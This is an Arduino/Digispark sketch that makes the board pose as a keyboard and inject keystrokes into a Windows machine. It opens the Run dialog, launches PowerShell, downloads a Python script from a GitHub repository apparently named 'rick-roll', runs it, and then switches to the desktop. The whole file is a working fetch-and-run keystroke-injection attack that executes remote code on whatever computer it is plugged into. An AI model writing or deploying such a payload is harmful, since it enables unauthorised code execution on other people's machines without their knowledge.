#include "DigiKeyboard.h"

void setup() {
  // Set LED pin as output (if using a board with an LED like Arduino)
  pinMode(1, OUTPUT);  // Assuming LED is connected to pin 1

  DigiKeyboard.sendKeyStroke(0);  // Prevents sleep

  // Open the Run dialog
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  // Type and execute 'powershell'
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // PowerShell command to download the file
  DigiKeyboard.print("$url = \"https://github.com/piyush-panpaliya/rick-roll/raw/main/a.py\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  
  DigiKeyboard.print("Invoke-WebRequest -Uri $url -OutFile \"a.py\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // Run the downloaded executable
  DigiKeyboard.print("python a.py");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT); // Win + Shift



  // Turn on the LED
  digitalWrite(1, HIGH);  // Set the LED pin high to turn it on

  
}


void loop(){
}
